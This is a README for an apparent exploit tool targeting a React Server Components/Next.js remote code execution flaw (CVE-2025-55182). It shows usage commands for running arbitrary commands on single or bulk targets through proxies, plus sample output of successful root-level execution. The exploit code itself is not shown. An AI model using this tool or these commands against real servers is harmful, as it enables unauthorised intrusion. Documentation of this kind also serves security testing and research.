@#React2Hell — CVE-2025-55182 Exploit

🔥 *Next.js / React Server Remote Code Execution (RCE) Exploit*

```
█████▄  ▄▄▄▄▄  ▄▄▄   ▄▄▄▄ ▄▄▄▄▄▄ ████▄ ▄▄▄▄▄  ██  ██ ▄▄▄▄▄ ▄▄    ▄▄    
██▄▄██▄ ██▄▄  ██▀██ ██▀▀▀   ██    ▄██▀ ██▄▄   ██████ ██▄▄  ██    ██    
██   ██ ██▄▄▄ ██▀██ ▀████   ██   ███▄▄ ▄▄▄███ ██  ██ ██▄▄▄ ██▄▄▄ ██▄▄▄ 
                                                                
{MAGENTA} Next.js/React Server RCE Exploit — CVE-2025-55182
 Author: Ankit Pandey GitHub: https://github.com/ankitspandey07
    🚀  React2Shell — Security Testing Utility  🚀

════════════════════════════════════════════════════════════════════════
usage: new.py [-h] [-u URL] [-l LIST] -c COMMAND [--proxy PROXY] [--proxy-https PROXY_HTTPS]
```

---

## 🚀 Overview

**React2Hell** is a powerful exploitation tool designed to test and exploit **CVE-2025-55182**, a critical Remote Code Execution vulnerability affecting **Next.js** & **React Server Actions**.

A pre-authentication remote code execution vulnerability exists in React Server Components versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 including the following packages: react-server-dom-parcel, react-server-dom-turbopack, and react-server-dom-webpack. The vulnerable code unsafely deserializes payloads from HTTP requests to Server Function endpoints.

---

## ✨ Features

* 🧨 **Remote Code Execution (RCE)**
* 🌐 **Single URL / Bulk URL scanning**
* 🧩 **Custom command execution**
* 🕵️‍♂️ **Stealth mode with proxy support**
* ⚡ Fast, reliable, and easy to use

---

## 📌 Usage

### **Single Target Mode**

```
python Scanner.py -u https://target.com -c "whoami"
```

### **Multiple Targets (from file)**

```
python Scanner.py -l urls.txt -c "whoami"
```

### **With HTTP Proxy (Burp Suite)**

```
python Scanner.py -u https://target.com -c "whoami" --proxy 127.0.0.1:8080
```

### **With HTTPS Proxy**

```
python Scanner.py -u https://target.com -c "whoami" --proxy-https 127.0.0.1:8080
```

---

## 📁 urls.txt Example

```
http://site1.com
https://site2.com
http://192.168.1.10:3000
```

---

## 🖥️ Sample Output

```
PS D:\Ankitspandey07\React2Hell> python.exe .\Scanner.py -l .\list.txt -c whoami


█████▄  ▄▄▄▄▄  ▄▄▄   ▄▄▄▄ ▄▄▄▄▄▄ ████▄ ▄▄▄▄▄  ██  ██ ▄▄▄▄▄ ▄▄    ▄▄    
██▄▄██▄ ██▄▄  ██▀██ ██▀▀▀   ██    ▄██▀ ██▄▄   ██████ ██▄▄  ██    ██    
██   ██ ██▄▄▄ ██▀██ ▀████   ██   ███▄▄ ▄▄▄███ ██  ██ ██▄▄▄ ██▄▄▄ ██▄▄▄ 
                                                                
{MAGENTA} Next.js/React Server RCE Exploit — CVE-2025-55182
 Author: Ankit Pandey GitHub: https://github.com/ankitspandey07
    🚀  React2Shell — Security Testing Utility  🚀

════════════════════════════════════════════════════════════════════════
[+] Loaded 3 targets
════════════════════════════════════════════════════════════════════════

[→] Target: http://evil.com:3113/
[→] Exec:   whoami
[✓] VULNERABLE — RCE Successful!
------------------------------------------------------------
root
------------------------------------------------------------
────────────────────────────────────────────────────────────────────────

[→] Target: http://example.lab:2000/
[→] Exec:   whoami
[✗] Not vulnerable — Status: 200
────────────────────────────────────────────────────────────────────────

[→] Target: https://tale.lab:3000/
[→] Exec:   whoami
[✓] VULNERABLE — RCE Successful!
------------------------------------------------------------
win-1fl835ovldc\\administrator
------------------------------------------------------------
────────────────────────────────────────────────────────────────────────
[✓] Scan complete — Vulnerable: 2
PS D:\Ankitspandey07\React2Hell>
```

---

## ⚠️ Disclaimer

> **This tool is created strictly for educational & security research purposes.
> Do NOT use it on systems without explicit authorization.
> You are responsible for your own actions.**

---

## ⭐ Support the Project

If this exploit helped you, consider leaving a ⭐ on GitHub ❤️

---

## 👤 Author

**Ankit Pandey; GitHub: https://github.com/Ankitspandey07**

Made with 🔥 by someone who is Proud and Passionate Pentester, who thrives to learn on every step of the way.

---
